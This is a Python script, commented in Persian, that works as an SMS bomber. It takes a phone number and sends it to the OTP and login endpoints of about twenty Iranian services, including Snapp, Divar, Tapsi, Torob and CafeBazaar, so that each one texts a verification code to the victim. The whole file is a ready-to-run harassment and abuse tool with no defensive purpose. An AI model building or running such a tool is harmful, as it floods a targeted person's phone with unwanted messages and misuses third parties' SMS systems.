import requests
import time

def send_otp_requests(phone_number):
    """
    Generates a list of APIs along with their respective URLs and data payloads
    for sending OTP requests to the provided phone number.
    """
    apis = [
        {
            "name": "Snapp V1",
            "url": "https://api.snapp.ir/api/v1/sms/link",
            "data": {"phone": phone_number},
        },
        {
            "name": "Snapp V2",
            "url": f"https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone={phone_number}",
            "data": {"cellphone": phone_number},
        },
        {
            "name": "Achareh",
            "url": "https://api.achareh.co/v2/accounts/login/",
            "data": {"phone": f"98{phone_number[1:]}"},
        },
        {
            "name": "Zigap",
            "url": "https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp",
            "data": {"phoneNumber": f"+98{phone_number[1:]}"},
        },
        
        {
            "name": "Divar",
            "url": "https://api.divar.ir/v5/auth/authenticate",
            "data": {"phone": phone_number},
        },
        {
            "name": "Sheypoor",
            "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
            "data": {"username": phone_number},
        },
        {
            "name": "Tapsi",
            "url": "https://api.tapsi.ir/api/v2.2/user",
            "data": {
                "credential": {"phoneNumber": phone_number, "role": "DRIVER"},
                "otpOption": "SMS",
            },
        },
        {
            "name": "GapFilm",
            "url": "https://core.gapfilm.ir/api/v3.1/Account/Login",
            "data": {"Type": "3", "Username": phone_number[1:]},
        },
        {
    "name": "SanatBazar",
    "url": "https://www.sanatbazar.com/livewire/update",
    "data": {"emailMobile": phone_number},
    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
},
{
    "name": "Basalam",
    "url": "https://auth.basalam.com/captcha/otp-request",
    "data": {"mobile": phone_number},
    "headers": {"Content-Type": "application/json"},
},
{
    "name": "Okala",
    "url": "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister",
    "data": {"mobile": phone_number},
    "headers": {"Content-Type": "application/json"},
},
{
    "name": "Snapp Market",
    "url": f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={phone_number}",
    "data": None,
},
{
    "name": "Telewebion",
    "url": "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one",
    "data": {"identifier": f"98{phone_number[1:]}"},
    "headers": {"Content-Type": "application/json"},
},
{
    "name": "Telewebion",
    "url": "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one",
    "data": {"identifier": phone_number},
    "headers": {"Content-Type": "application/json"},
},
{
    "name": "Faradars OTP",
    "url": "https://api.faradars.org/api/client/v1/auth/otp",
    "data": {"mobile": phone_number},
    "headers": {"Content-Type": "application/json"},
},
{
    "name": "Faradars OTP",
    "url": "https://api.faradars.org/api/client/v1/auth/otp",
    "data": {"mobile": phone_number},
    "headers": {"Content-Type": "application/json"},
},
{
    "name": "Maktabkhooneh OTP",
    "url": "https://maktabkhooneh.org/api/v1/auth/check-active-user",
    "data": {
        "csrfmiddlewaretoken": "3TAHzlBuhjgSAeHDc3o9wg5R9OjboyF9PPqOpejm2FSu61OzpnyKTlGIkp636YI6",
        "tessera": phone_number,
        "g-recaptcha-response": "recaptcha-token"
    },
    "is_multipart": True,
},  

{
    "name": "Eynakluna Login Request",
    "url": "https://eynakluna.ir/api/v1/sessions/login_request",
    "data": {"phone": phone_number},
    "headers": {"Content-Type": "application/json"},
},
{
    "name": "Torob Send PIN",
    "url": "https://api.torob.com/v4/user/phone/send-pin/",
    "params": {
        "phone_number": phone_number,
        "_http_referrer": "https://www.google.com/",
        "source": "next_desktop"
    },
    "headers": {"Content-Type": "application/json"},
}, 
{
    "name": "Eynakluna Login Request",
    "url": "https://eynakluna.ir/api/v1/sessions/login_request",
    "data": {"phone": phone_number},
    "headers": {"Content-Type": "application/json"},
},
{
    "name": "Shad Messenger LMS",
    "url": "https://shadmessenger170.iranlms.ir/api/v1/user/otp",  
    "data": {"mobile": phone_number},
    "headers": {"Content-Type": "application/json"},
},

{
    "name": "CafeBazaar OTP",
    "url": "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest",
    "data": {
        "properties": {
            "clientID": "ioiq2c7d3uxg2d3307a97vm6pxxnjmla",
            "clientVersion": "web",
            "deviceID": "ioiq2c7d3uxg2d3307a97vm6pxxnjmla",
            "language": 2
        },
        "singleRequest": {
            "getOtpTokenRequest": {
                "username": phone_number
            }
        }
    },
    "headers": {
        "Content-Type": "application/json"
    }
},

    ]

    return apis

if __name__ == "__main__":
    phone_number = input("شماره تلفن را وارد کنید (مثلاً 09123456789): ")

    apis = send_otp_requests(phone_number)

    for api in apis:
        print(f"\n⏳ در حال ارسال به {api['name']} ...")
        try:
            headers = {"Content-Type": "application/json"}
            response = requests.post(api['url'], json=api['data'], headers=headers, timeout=1)
            print(f"✅ {api['name']} | کد پاسخ: {response.status_code}")
        except Exception as e:
            print(f"❌ خطا در {api['name']}: {e}")
        time.sleep(2)
